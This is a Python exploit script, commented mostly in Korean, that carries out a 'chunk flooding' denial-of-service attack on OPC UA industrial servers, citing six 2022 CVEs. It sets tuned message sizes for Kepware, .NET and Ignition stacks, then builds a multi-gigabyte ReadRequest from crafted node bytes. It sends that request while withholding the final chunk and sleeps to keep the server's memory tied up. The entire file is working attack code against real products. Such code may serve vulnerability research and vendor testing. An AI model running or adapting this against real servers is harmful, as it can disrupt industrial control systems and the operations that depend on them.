# Chunk Flooding Attack
#   Sending huge amount of chunks without the Final chunk.
#
# CVEs:
#   - CVE-2022-29864: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-29864.pdf
#   - CVE-2022-21208: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988723
#   - CVE-2022-25761: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25761
#   - CVE-2022-25304: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25304
#   - CVE-2022-24381: https://security.snyk.io/vuln/SNYK-UNMANAGED-ASNEGOPCUASTACK-2988735
#   - CVE-2022-25888: https://security.snyk.io/vuln/SNYK-RUST-OPCUA-2988751

import datetime

from protocol import *  # OPC UA 프로토콜 관련 모듈
from config import *  # 설정값을 포함하는 모듈

# 여러 OPC UA 스택에서 청크 과부하 공격을 시도하는 코드입니다.
# 이 공격은 수많은 청크 메시지를 전송하지만 마지막 청크는 의도적으로 생략하여 서버에 부담을 줍니다.
# 이 공격과 관련된 CVEs는 다음과 같습니다:
#   - CVE-2022-29864, CVE-2022-21208, CVE-2022-25761, CVE-2022-25304, CVE-2022-24381, CVE-2022-25888

# 각 OPC UA 서버 스택에 따른 최대 메시지 크기와 청크 크기
# Kepware, DOTNET, Prosys, Ignition 등의 서버에 대한 설정

MESSAGE_FACTOR_KEPWARE_MAX = 45000  # 약 10MB
MESSAGE_CHUNK_SIZE_MAX_KEPWARE = 2000

MESSAGE_FACTOR_DOTNET_MAX = 10000000  # 약 2000MB
MESSAGE_CHUNK_SIZE_MAX_DOTNET = 2000

MESSAGE_FACTOR_IGNITION_MAX = 710  # 약 65KB
MESSAGE_CHUNK_SIZE_MAX_IGNITION = 3000

# 기본값 설정
MESSAGE_FACTOR_DEFAULT = MESSAGE_FACTOR_DOTNET_MAX
MESSAGE_CHUNK_SIZE = MESSAGE_CHUNK_SIZE_MAX_DOTNET

# 공격 함수
def attack(server_details, message_factor=MESSAGE_FACTOR_DEFAULT, max_chunk_size=MESSAGE_CHUNK_SIZE):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.session_timeout = 3600 * 1000  # 1시간 세션 타임아웃
    opcua.requested_lifetime = 3600 * 1000  # 1시간 요청 유효시간
    opcua.max_chunk_size = max_chunk_size
    opcua.create_session()

    # 메시지 헤더와 본문 생성
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=631)
    message_body += struct.pack("<Q", 0)  # Max age (0으로 설정)
    message_body += struct.pack("<I", 3)  # 타임스탬프 반환 설정 (Neither)

    # 노드 읽기 요청 (잘못된 포맷의 배열 사용)
    nodes_to_read = bytes.fromhex(
        "000000000100b73a05000000ffffffff0000ffffffff0100b93a05000000ffffffff0000ffffffff0100203e05000000ffffffff0000ffffffff0100df3c05000000ffffffff0000ffffffff01001a3d05000000ffffffff0000ffffffff01001e3d05000000ffffffff0000ffffffff0100263d05000000ffffffff0000ffffffff01002a3d05000000ffffffff0000ffffffff005e05000000ffffffff0000ffffffff01002e3c05000000ffffffff0000ffffffff005f05000000ffffffff0000ffffffff01005b0105000000ffffffff0000ffffffff"
    )
    
    # 메시지를 너무 긴 형태로 생성
    message = message_header + message_body + nodes_to_read * message_factor

    # 메시지 전송 (마지막 청크 생략)
    print(f"[-] Sending MSG Request - Very long message ({len(message)/1024/1024:.2f} MB) with chunks x 1")
    opcua.send_recv(message, count=1, should_recv=False, hold_final_chunk=True)

    # 청크를 메모리에 남기기 위한 대기 시간
    print("[-] Sleeping to keep all chunks in memory (don't close)...")
    time.sleep(200000)
